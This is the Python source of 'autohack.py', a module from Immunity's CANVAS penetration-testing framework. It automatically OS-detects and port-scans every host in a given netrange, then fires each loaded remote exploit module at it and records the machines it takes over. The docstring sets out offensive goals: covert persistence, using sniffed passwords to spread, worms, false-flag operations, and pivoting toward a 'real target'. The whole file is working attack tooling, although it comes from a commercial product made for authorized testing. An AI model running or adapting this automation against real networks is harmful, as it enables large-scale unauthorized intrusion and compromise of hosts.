#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
autohack.py

Given a list of hostnames/ips/networks
AND MISSION
Mission examples:
    1. Read mail of X user set
    2. Obtain access to host
    3. Obtain as much access as possible (recon)
AND COVERTNESS:
    1. Avoid being caught at all costs
    ...
    10. Go nuts.
AND bouncehostlist of previously owned hosts which we can use to bounce off
or netmask of hosts to hack to obtain bouncehosts www.cn.com/24, etc.

1. Does preliminary look at the hosts to find high-priority hosts
2. Scans those hosts
3. Obtains access to hosts and conducts recon
4. Establishes permanent presense on those hosts
5. Explores wisely using bounce hosts (or NOT reusing them), technologies, and other methods for covertness
6. Monitors listening posts and conducts collection against them
7. Attempts to use sniffed passwords/etc to broaden access
8. Attempts to discover if it has been found
9. Launches AO worms
10. Runs false-flag operations
11. Makes corrolations between users and connectivity
  1. If I see a user "bobr" on two different hosts, then I can guess that is the
  same user, with the same password and these machines are related. If bobr and
  samr are known to be related, then I attach more signifigance to owning the
  servers bobr is on to get to samr, my real target.
12. Adds to bouncehostlist
13. Can be paused, restarted, etc.
14. Conducts web attacks, recon from various things it can discover via spidering, google groups, etc
15. Guesses the network policy - for firewalls, it's usefull to know what ports are allowed
and do gap analysis as time goes on. For client side hacking, it's good to already know
what the proxies are, etc.
16. Draws network diagrams and timelines.


   
"""


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation


VERSION="1.0"
NOTES2="""

"""

CHANGELOG="""
1.0 
Created.
"""

DEBUGNOTES="""
    
"""

import sys
if "." not in sys.path: sys.path.append(".")


from exploitutils import *
from tcpexploit import tcpexploit
from msrpc import *
from exploitmanager import exploitmanager
import CANVASNode
import canvasengine
import libs.canvasos as canvasos
    
DOCUMENTATION={}
DOCUMENTATION["Notes"]="Automatically will portscan and attack all the boxes it can find\n"
DOCUMENTATION["Notes"]+="within the netrange you specify. Portscanning can take a VERY long time if\n"
DOCUMENTATION["Notes"]+="covertness is 1. You might try setting it to 5."


NAME="AutoHack"
DESCRIPTION="Try to hack into the given box"

VERSION="0.1"

affectsList=["Tools"]

NOTES=""" 

"""

CHANGELOG="""
  
"""
class AutoHackError(Exception): 
    pass

def isexploit(module):
    """
    Returns true if the module is a remote exploit. We don't 
    want to run non-exploits, because that's a waste of time.
    """
    if hasattr(module,"PROPERTY"):
        if module.PROPERTY.get('SITE', '^_^') == "Remote": 
            return True
    return False
        
UNKNOWN = 0
WIN     = 1
UNIX    = 2

# set the SCAN version here

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.onlymodule="" #set this if you want autohack to only do one module
        #this is useful when you're testing autohack with just lsass for example
        self.name = NAME        
        self.setPort(0)
        self.setHost("")
        self.setVersion(0)
        self.badstring="\x00\r\n\t %"
        self.searchbadstring="\x00\\/.:$"
        self.istest=0
        self.setVersions()
        self.shellcode="A"
        self.localhost=""
        self.localport=0
        self.ssl=0
        self.doshell=1
        self.usedvuln=None #vulnerability we succeeded with
        self.force=0
        self.progress=0
        self.setVersions()
        # Denial of Services, etc are banned
        # These are NAMES - not the actual module filename
        #if you run testhost, it'll call every exploits' test function, which is horribly bad
        self.banned  = ["autohack","portscan","testhost","VulnAssess","abyss","javapxy"]
        self.banned += ["blindisapi","http fuzzer","fp30reg","http server"]
        self.banned += ["smbbrute","smbclient","Mass Attack"]
        self.banned += ["Apache Chunk win32", "WS_FTPD Stack Overflow"] 
        self.exploit_modules=None
        self.recon_version = 1
        self.exploits=[]
        self.netmask="32"
        self.result=[] #list of (host,vuln) used to own it
        self.lowport=1
        self.highport=1024
        self.portscantype="fast"
        self.ignore_unidentified_hosts=1
        self.portscan=0 #default to no portscan
        
        return

    def setTest(self,test):
        self.istest=test
        return
    
    def setVersions(self):
        self.versions={}
        self.versions[0]=("Automatically determine version type",UNKNOWN)
        self.versions[1]=("Windows NT SP6A",WIN)
        self.versions[2]=("Windows 2000 SP1", WIN)
        self.versions[3]=("Windows 2000 SP2",WIN)
        self.versions[4]=("Windows 2000 SP3",WIN)
        self.versions[5]=("Windows 2000 SP4",WIN)
        self.versions[6]=("Windows XP SP1",WIN)
        self.versions[7]=("Windows XP SP2",WIN)
        self.versions[8]=("Windows Server 2003" ,WIN)
        self.versions[9]=("Linux",UNIX)
        self.versions[10]=("Mandrake Linux",UNIX)
        self.versions[11]=("Suse Linux", UNIX)
        self.versions[12]=("Red Hat Linux", UNIX)
        self.versions[13]=("Debian Linux", UNIX)
        self.versions[14]=("Solaris 2.6", UNIX)
        self.versions[15]=("Solaris 7", UNIX)
        self.versions[16]=("Solaris 8", UNIX)
        return 
         
    def getAffectsList(self, myos):
        myos = str(myos).upper()
        print "xxxx", myos
        
        # altered for PROPERTY, win32 is still on affectsList
        if myos.find("WIN") > -1:
            return "Windows"
        elif myos.find("LINUX") > -1:
            return "Linux"
        elif myos.find("SOLARIS") > -1:
            return "Solaris"
        elif myos.find("FREEBSD") > -1:
            return "FreeBSD"
        elif myos.find("MAC OS X") > -1:
            return "MacOSX"
        elif myos.find("AIX") > -1:
            return "AIX"
        elif myos.find("EMBEDDED") > -1:
            return "Embedded"
        else:
            return "Unknown"
        
    def doRecon(self, module, target):
        self.log("Doing recon with %s"%module)
        scan=canvasengine.getModuleExploit(module)
        scan.link(self)
        scan.argsDict["postscan"]="ifids" #do ifids afterwards if possible
        if self.portscantype=="fast":
            #add the ports you want to portscan here...we pass this as a list to the portscanner
            scan.argsDict["mode"]="chosen ports"
            scan.argsDict["allports"]=range(1,1025)+[7100]
        #if we're running locally on a windows or cygwin box, then
        #we need to set covertness to 10 so that the portscan doesn't 
        #take forever
        #if self.argsDict["passednodes"][0].nodetype=="LocalNode" and os.name.lower() in ["nt"]:
        #    scan.covertness=10
        #    self.log("Set covertness to 10 for Windows user.")
        scan.target = target
        scan.run()
        return scan.result

    def getListener(self, app):
        """
        Gets the listener for the exploit to use - we can have many different
        kinds of listeners since each exploit can have a different one.
        
        Returns -1 on failure (extremely rare).
        Returns none if no listener is needed
        returns a listener otherwise
        """
        neededtypes=app.neededListenerTypes()       
        if neededtypes!=[]:
            listener= self.engine.autoListener(neededtypes[0])
            if listener==None: #still none? Then print error message
                self.engine.log("You need to select a valid listener %s for this exploit! (Is it blue?)"%(app.neededListenerTypes()))
                self.log("Returning from runExploit()")
                return -1
            #print "Setting listener %s argsdict to %s"%(listener, app.listenerArgsDict)
            listener.argsDict=app.listenerArgsDict
                                                                                
        else:
            listener=None
        app.callback=listener #note: this is a listener, not an interface!
        return listener
    
    

        
    def runExploit(self, app):
        """
        run the exploit , including set up the listeners it needs for callbacks
        """
        #we don't do this autolistener stuff because that's done perfectly
        #well by the exploitmanager now...
        #ret=self.getListener(app)
        #self.log("Got listener result: %s"%ret)
        #if ret==-1:
        #    #we failed to get a listener, but we wanted one 
        #    return 0
        
        #we're single threaded so we can feel free to use this 
        #self.variable for the manager
        #self.manager=exploitmanager(app, self.engine)
        ret = self.manager.run()
        self.exploits.append(app)

        
        if isinstance(ret, CANVASNode.CANVASNode) or app.ISucceeded():
            devlog("autohack", "Exploit returned %s"%ret)
            self.log("Finished runExploit in autohack successfully!")
            return ret
        return None

    def setExploit(self, app, app_class):
        app.argsDict = self.argsDict
        app.argsDict["passednodes"] = self.argsDict["passednodes"]
        app.argsDict["port"]= str(app.port)
        app.argsDict["autohack_state"]=self.autohack_state
        app.target = self.target
        
        app.setId(self.engine.getNewListenerId())
        app.engine = self.engine
        app.setLogFunction(self.engine.exploitlog)
        app.setDebugFunction(self.engine.exploitdebuglog)
        app.setInfo(app.getInfo())
        #self.engine.addExploitLine(app)
        app.setCovertness(self.engine.getCovertness())
        self.manager=exploitmanager(app, self.engine)
        
        return self.manager

    def run_on_host(self,target):
        if self.version == 0:
            kprim=target.get_knowledge("OS")
            if kprim== None:
                self.set_current_attack_module("osdetect")
                self.doRecon("osdetect", target)
                self.set_current_attack_module("autohack")
                kprim=target.get_knowledge("OS")

            if kprim:
                myos=kprim.known
            else: 
                myos="UKNOWN" # This is not supposed to happen
            if (myos=="UNKNOWN" or str(myos)=="") and self.ignore_unidentified_hosts:
                self.log("Ignoring host %s since it cannot be os-id'd"%self.host)
                return 0
        elif self.version == 1:
            # Create a new canvasos object set to Windows
            # XXX: JMS - is this a sane default? Perhaps 2k3?
            myos = canvasos.new("Windows")
        else:
            # Create a default Linux canvasos object
            myos = canvasos.new("Linux")
            
        objos = myos
        myos = str(myos) #switch this to a string, even though it is an object that is returned   
        self.log("Os detected: %s" % myos)
        
        #now check netbios if available against engine's smartlist
        #assuming self.engine exists and is initialized
        allKnowledge=target.get_all_knowledge_as_text()
        self.log("All Knowledge=%s"%allKnowledge)
        
        netbios=target.get_knowledge("SMBServer",None)
        dontattack=False
        if netbios:
            dontattack=self.engine.smartlist.check_netbios(netbios)
        if dontattack:
            self.log("SmartList check told me not to attack this host")
            return 0
        
        if myos.count("Unknown"):
            self.log("OS is Unknown , not continuing Autohack!")
            return 0
        
        if int(self.argsDict.get("portscan", 1)):
            self.doRecon("portscan", target)

        #theoretically could do a portscan to filter this list down
        #with mode="chosen ports"

        kprim = target.get_knowledge("TCPPORTS")
        openports=[]

        if kprim and isinstance(kprim.known, list):
            openports = kprim.known
            #need to convert this to a list of integers, if it's not
            #already. In our knowledge base this is stored as a list of strings
            #instead
            openports = map(int, openports)
        else:
            #just some default ports
            openports=[135, 139, 143, 445, 80, 21, 25, 23, 7100]
        
        self.log("Open Ports: %s" % openports)

        affected = self.getAffectsList(myos)
        if affected=="Unknown":
            self.log("Not attacking unknown target")
            return 0
        
        ##Do we have an explicit list of modules ala VulnAssess2 or just do all we can ala massattack2 ?
        if self.exploit_modules:
            for mod in self.exploit_modules:
                exploitmods[mod]=canvasengine.getModule(mod)
        else:
            ##Nope use them all .....
            exploitmods = canvasengine.exploitmodsGet()
            
        if 1:
            #debug
            for mod in exploitmods:
                self.log("Loaded: %s"%(str(mod)))

        totalmods=len(exploitmods)
        currentmod=1
        self.log("Testing against: ")
        for module in exploitmods.values():
            if self.state==self.HALT:
                break
            #run all the exploits on this host
            if hasattr(module, "DESCRIPTION"):
                description=module.DESCRIPTION #save this off
            else:
                raise Exception, "Module %s does not have a DESCRIPTION"%str(module)
            self.log("Trying %s"%description)
            

            goodOS = False
            for tos in module.TARGET_CANVASOS_LIST:
                if objos.isSameAs(tos):
                    goodOS = True
                    break
            
            if not goodOS:
                self.log("Autohack considered module %s not suitable for remote os %s"  % (module.NAME, objos))
                continue
                
            """
            #quick test to see if the affectsList even exists
            propcheck = 0
            a = []
            if not hasattr(module, "affectsList") or module.affectsList == "":
                # try to be backwards compatible for now
                # we have to be consistent in Solaris/MacOSX/etc. case sensitivity
                # maybe toupper or tolower that when we're moving fully
                propcheck = 1

            # who wrote autohack btw?, anyhoo ugly because we need to be b.c.
            if propcheck:
                try:
                    a = []
                    for x in module.PROPERTY['ARCH']:
                        if isinstance(x, list):
                            a.append(x[0])
                        else:
                            a.append(x)
                except:
                    self.log("No ARCH property on %s"%description)
                    continue

            # check teh list
            if propcheck:
                print "Autohaxx Considering architectures: %s %s" % (module.NAME, a)
                aFound = 0
                for l in a: #for item in affectsList
                    if affected in str(l):
                        aFound = 1
                if not aFound:
                    self.log("ARCH not found: %s in %s"%(affected,a))
                    continue
                try:
                    if len(module.PROPERTY["VERSION"]):
                        if objos.version in module.PROPERTY["VERSION"] or "All" in module.PROPERTY["VERSION"] :
                            print "Autohack version check says yes for %s: os version (%s) in list: %s" % (module.NAME, objos.version, module.PROPERTY["VERSION"])
                            pass
                        else:
                            print "Autohack not proceeding with %s, as OS version (%s) not in version list: %s" % (module.NAME, objos.version, module.PROPERTY["VERSION"])
                            continue
                except KeyError:
                    print "Autohack module %s has no VERSION" % module.NAME
                    # No version property, so nothing to check.
                    pass
            else:
                if a and affected not in str(a):
                    self.log("Arch not found: %s in %s"%(affected,a))
                    #we move on to the next module
                    continue
            """

            if module.NAME.lower() in self.banned:
                self.log("Module %s is banned"%module.NAME)
                continue
            
            if not isexploit(module):
                self.log("Not a remote exploit: %s"%module.NAME)
                continue

            self.log("Scanning with %s"%module.NAME)
            progress=round((currentmod*100)/totalmods)
            self.log("CurrentMod %d Total Modules: %d Progress %d"%(currentmod,totalmods,progress))
            self.setProgress(progress)
            currentmod+=1
            try:
                self.set_current_attack_module( module.NAME )
                app = module.theexploit()
            except:
                self.log("No theexploit class in module %s"%module.DESCRIPTION)
                continue
            app.link(self)
            self.log("openports=%s"%openports)    
            if app.port not in openports and app.port!=0:
                self.log("Port %s not in %s"%(app.port,openports))
                self.log("Skipped module %s"%module.DESCRIPTION)
                continue
            else:
                self.log("Running %s"%module.DESCRIPTION)

            try:
                manager = self.setExploit(app, module)
                if manager.test():
                    vuln="Vulnerable"
                else:
                    vuln="Not Vulnerable"
                    self.log("(%s) %s: Possible %s" % (app.port, module.NAME, vuln))
                    continue
                

            except:
                import traceback
                print "\t ==> Error" 
                traceback.print_exc(file=sys.stderr)
                continue
                
            ret=self.runExploit(app)
            
            # The exploit returned us the result no need to do anything further
            if type(ret) == str:
                return ret

            if app.ISucceeded():            
                self.log("Exploit returned %s"%ret)
                self.target.add_knowledge("Exploited using", app.name, 100)
                self.log("Exploited using %s!"%app.name)
                newnode=ret
                if newnode in [0,1,None]:
                    #BUG BUG what if exploit returned multiple nodes?
                    self.log("Exploit succeeded but did not return a node - getting new node from exploit manager")
                    #we sleep until the manager has finished waiting for the new node
                    #to be set up. He'll only wait if there was a callback
                    #which means things like dcedump don't mess with us here.
                    #any exceptions in manager.run() might though, so we have to be careful of that
                    while self.manager.state!="Done":
                        time.sleep(1)
                    newnode=self.manager.newnode
                    if not newnode:
                        self.log("Did not get a node from the exploit")
                    else:
                        self.log("Got node from callback!")
                else:
                    self.log("Target returned a node of type %s"%newnode.nodetype)
                self.result+=[(target,app.name,newnode)]
                #we don't return ret because startup has already been called on it
                return 1
            
        self.set_current_attack_module( "autohack")   
        return 0
    
    def getargs(self):
        self.netmask=self.argsDict.get("netmask",self.netmask).replace("/","")
        self.host=self.target.interface
        self.ignore_unidentified_hosts=self.argsDict.get("ignore_unid_hosts",self.ignore_unidentified_hosts)
        self.portscan=int(self.argsDict.get("portscan", self.portscan))
        self.maxthreads=int(self.argsDict.get("maxthreads",self.maxthreads))
        return
    
    def run(self):
        self.getargs()        
        self.log("Netmask=%s"%self.netmask)

        if not canvasengine.registeredallmodules:
                canvasengine.registerAllModules()        
        
        ret=self.run_on_all_alive_hosts()
        self.log("Autohack report:")
        for host, vuln, newnode in self.result:
            self.log("Used %s on %s"%(vuln,host.interface))
            self.usedvuln=vuln
        self.log("End of autohack report")
        #print "Ret=%s"%ret #this is theexploit instance?!?
        return ret 
                    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])
            

    
#this stuff happens.
if __name__ == '__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)

